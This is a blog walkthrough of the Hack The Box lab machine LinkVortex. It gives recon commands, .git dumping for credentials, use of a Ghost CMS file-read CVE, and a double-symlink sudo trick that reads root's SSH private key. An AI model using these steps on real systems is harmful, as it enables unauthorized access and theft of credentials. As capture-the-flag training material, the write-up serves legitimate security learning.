<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: LinkVortex</title>
<meta name=description content="Platform: Hack The Box Link: LinkVortex Level: Easy OS: Linux LinkVortex runs a vulnerable version of Ghost CMS. Through directory brute-forcing and subdomain …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-linkvortex/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: LinkVortex"><meta property="og:description" content="Platform: Hack The Box Link: LinkVortex Level: Easy OS: Linux LinkVortex runs a vulnerable version of Ghost CMS. Through directory brute-forcing and subdomain …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-LinkVortex/LinkVortex"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-LinkVortex/LinkVortex"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: LinkVortex"><meta name=twitter:description content="Platform: Hack The Box Link: LinkVortex Level: Easy OS: Linux LinkVortex runs a vulnerable version of Ghost CMS. Through directory brute-forcing and subdomain …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-linkvortex/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-linkvortex/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-LinkVortex/LinkVortex"><link rel=canonical href=https://scorpiosec.com/posts/htb-linkvortex/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-linkvortex/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: LinkVortex</h1><small role=doc-subtitle></small><p class=post-date>4 min read |
<span class=post-date>April 11, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/LinkVortex>LinkVortex</a></li><li>Level: Easy</li><li>OS: Linux</li></ul><hr><p>LinkVortex runs a vulnerable version of Ghost CMS. Through directory brute-forcing and subdomain enumeration, we discover the admin login page and an exposed <code>.git</code> directory, which contains valid credentials for authentication. We then leverage <code>CVE-2023-40028</code>, a file read vulnerability, to read sensitive files on the server, eventually finding another set of credentials. These allow us to gain an initial foothold via SSH. Privilege escalation is achieved by exploiting a script executable as root.</p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV {TARGET_IP}
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-02-11 09:42 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.231.194
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.13s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd
</span></span><span style=display:flex><span>|_http-server-header: Apache
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://linkvortex.htb/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 23.71 seconds
</span></span></code></pre></div><p>Two open ports are found: <code>22</code> running SSH and <code>80</code> running http. Additionally there is a redirection to <code>linkvortex.htb</code>.</p><pre tabindex=0><code>sudo echo &#34;{TARGET_IP} linkvortex.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>At <code>http://linkvortex.htb/</code> we find a static website powered by <a href=https://ghost.org/>Ghost CMS</a>. Wappalyzer tells us that <code>version 5.58</code> is used.</p><p><img src=/images/HTB-LinkVortex/linkvortex_website.png alt="LinkVortex website"></p><p>With directory brute forcing we find <code>/ghost</code>.</p><pre tabindex=0><code>feroxbuster -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 200 -r --scan-dir-listings -C 403,404
</code></pre><p><img src=/images/HTB-LinkVortex/ghost_directory.png alt="ghost hidden directory"></p><p>Visiting <code>http://linkvortex.htb/ghost/</code> we get to an Admin login page.</p><p><img src=/images/HTB-LinkVortex/ghost_admin_page.png alt="ghost admin page"></p><p>With some subdomain enumeration we discover the <code>dev</code> subdomain.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://linkvortex.htb -H &#34;Host: FUZZ.linkvortex.htb&#34; -ic -fs 230
</code></pre><p><img src=/images/HTB-LinkVortex/subdomain_dev.png alt="dev subdomain found"></p><p><code>http://dev.linkvortex.htb/</code> leads to another website which is under construction.</p><p><img src=/images/HTB-LinkVortex/dev_subdomain_website.png alt="website at dev subdomain"></p><p>We go back to directory bruteforcing for the subdomain and find a <code>.git</code> directory.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://dev.linkvortex.htb/FUZZ -ic --fc 404,403
</code></pre><p><img src=/images/HTB-LinkVortex/subdomain_git.png alt="git hidden folder"></p><p>When visiting <code>http://dev.linkvortex.htb/.git</code> we find some files for a git repository.</p><p><img src=/images/HTB-LinkVortex/linkvortex_git_files.png alt="git files"></p><p>We dump the repository available at <code>http://dev.linkvortex.htb/.git</code> with <a href=https://github.com/arthaud/git-dumper>git-dumper</a>.</p><pre tabindex=0><code>git-dumper http://dev.linkvortex.htb/.git git_linkvortex
</code></pre><p><img src=/images/HTB-LinkVortex/git_dumper_linkvortex.png alt="git dumper command"></p><p>Inside the directory we look for credentials, using <code>grep -iR "password"</code>. A few possible password are discovered.</p><p><img src=/images/HTB-LinkVortex/passwords_found.png alt="passwords found in project files"></p><p>We are able to login at <code>http://linkvortex.htb/ghost</code> with <code>admin@linkvortex.htb:OctopiFociPilfer45</code> and get access to the Ghost dashboard.</p><p><img src=/images/HTB-LinkVortex/ghost_dashboard.png alt="Ghost Dashboard"></p><h2 id=intial-foothold>Intial Foothold</h2><p>Now that we have some valid credentials we can use <a href=https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028>this PoC</a> for <code>CVE-2023-40028</code> to read files on the target system.</p><p><img src=/images/HTB-LinkVortex/CVE-2023-40028.png alt=CVE-2023-40028></p><p>Among the repository files there is one called <code>Dockerfile.ghost</code>, checking its content we find a configuration file at <code>/var/lib/ghost/config.production.json</code>.</p><p>Using our file read vulnerability we read <code>/var/lib/ghost/config.production.json</code> and find the credentials for another user.</p><p><img src=/images/HTB-LinkVortex/creds_docker_config.png alt="Dockerfile config"></p><pre tabindex=0><code>bob@linkvortex.htb:fibber-talented-worth
</code></pre><p>We login via SSH as <code>bob</code> and can read the user flag.</p><p><img src=/images/HTB-LinkVortex/user_flag.png alt="user flag"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>We check the sudo privileges of the user and find out that he can run <code>/usr/bin/bash /opt/ghost/clean_symlink.sh *.png</code> as any user, without providing a password.</p><p><img src=/images/HTB-LinkVortex/sudo_privs_linkvortex.png alt="sudo privileges for bob"></p><p>The content of <code>/opt/ghost/clean_symlink.sh</code> is as below</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e06c75>QUAR_DIR</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/var/quarantined&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> -z <span style=color:#e06c75>$CHECK_CONTENT</span> <span style=color:#56b6c2>]</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  <span style=color:#e06c75>CHECK_CONTENT</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>LINK</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>$1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> ! <span style=color:#56b6c2>[[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$LINK</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>=</span>~ <span style=color:#98c379>\.</span>png$ <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#98c379>&#34;! First argument must be a png file !&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> /usr/bin/sudo /usr/bin/test -L <span style=color:#e06c75>$LINK</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>  <span style=color:#e06c75>LINK_NAME</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/basename <span style=color:#e06c75>$LINK</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>  <span style=color:#e06c75>LINK_TARGET</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/readlink <span style=color:#e06c75>$LINK</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> /usr/bin/echo <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$LINK_TARGET</span><span style=color:#98c379>&#34;</span> | /usr/bin/grep -Eq <span style=color:#98c379>&#39;(etc|root)&#39;</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;! Trying to read critical files, removing link [ </span><span style=color:#e06c75>$LINK</span><span style=color:#98c379> ] !&#34;</span>
</span></span><span style=display:flex><span>    /usr/bin/unlink <span style=color:#e06c75>$LINK</span>
</span></span><span style=display:flex><span>  <span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;Link found [ </span><span style=color:#e06c75>$LINK</span><span style=color:#98c379> ] , moving it to quarantine&#34;</span>
</span></span><span style=display:flex><span>    /usr/bin/mv <span style=color:#e06c75>$LINK</span> <span style=color:#e06c75>$QUAR_DIR</span>/
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>$CHECK_CONTENT</span>;<span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>      /usr/bin/echo <span style=color:#98c379>&#34;Content:&#34;</span>
</span></span><span style=display:flex><span>      /usr/bin/cat <span style=color:#e06c75>$QUAR_DIR</span>/<span style=color:#e06c75>$LINK_NAME</span> 2&gt;/dev/null
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>  <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span></code></pre></div><p>The <code>clean_symlink.sh</code> script is designed to handle symbolic links targeting <code>.png</code> files. It checks whether the provided file is a symlink and, if so, determines its target path. If the symlink points to a sensitive directory such as <code>/etc</code> or <code>/root</code>, the script deletes it. Otherwise, it moves the symlink to a quarantine directory (<code>/var/quarantined/</code>). Additionally, when the environment variable <code>CHECK_CONTENT=true</code> is set, the script attempts to read and display the contents of the file (or the file the symlink points to).</p><p>We can try to exploit the script with a symlink pointing to the root SSH key.</p><pre tabindex=0><code>touch id_rsa.png
ln -sf /root/.ssh/id_rsa id_rsa.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh id_rsa.png
</code></pre><p>As expected it gets removed.</p><p><img src=/images/HTB-LinkVortex/symlink_exploit_fail.png alt="Symlink exploit failure"></p><p>Let&rsquo;s try another method. This time we will use two symlinks in order to bypass the security feature of the script.</p><pre tabindex=0><code>cd ~
ln -s /root/.ssh/id_rsa id_rsa.txt
ln -s /home/bob/id_rsa.txt root.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/root.png
</code></pre><p><img src=/images/HTB-LinkVortex/root_exploitation.png alt="root privilege escalation"></p><p>We successfully exploit the script and obtain the root SSH key. We save the recovered SSH private key and use it to authenticate as the root user.</p><p><img src=/images/HTB-LinkVortex/root_flag.png alt="root flag"></p><h3 id=exploit-explanation>Exploit Explanation</h3><p>The script detects <code>root.png</code> as a valid file matching the <code>*.png</code> pattern and proceeds to process it. However, <code>root.png</code> is actually a symlink to <code>id_rsa.txt</code>, which is itself a symlink to <code>/root/.ssh/id_rsa</code>.</p><p>Since <code>CHECK_CONTENT=true</code>, the script displays the content of the file our symlink points to. Because the script runs with root privileges, it successfully follows both symlinks and ends up reading the contents of <code>/root/.ssh/id_rsa</code>.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-alert/>&#8592;
Previous:
HTB: Alert</a></p><p class=prev-post-date>March 21, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#intial-foothold>Intial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#exploit-explanation>Exploit Explanation</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>